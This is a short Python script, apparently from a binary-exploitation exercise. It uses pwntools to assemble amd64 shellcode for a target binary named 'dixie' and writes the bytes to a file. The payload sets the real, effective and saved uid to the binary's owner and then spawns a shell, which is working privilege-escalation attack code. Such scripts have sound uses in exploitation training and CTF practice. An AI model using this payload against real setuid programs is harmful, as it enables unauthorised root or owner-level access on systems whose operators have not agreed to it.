#!/usr/bin/env python3
# 1-shellcode.py

import os
import sys
import pwn

pwn.context.arch = 'amd64'
pwn.context.log_level = 'error'

binary = "./dixie"
if len(sys.argv) > 1:
    binary = sys.argv[1]

sc = pwn.asm(
    pwn.shellcraft.setresuid(os.stat(binary).st_uid)
    + pwn.shellcraft.sh()
)

with open("shellcode", "wb") as f:
    f.write(sc)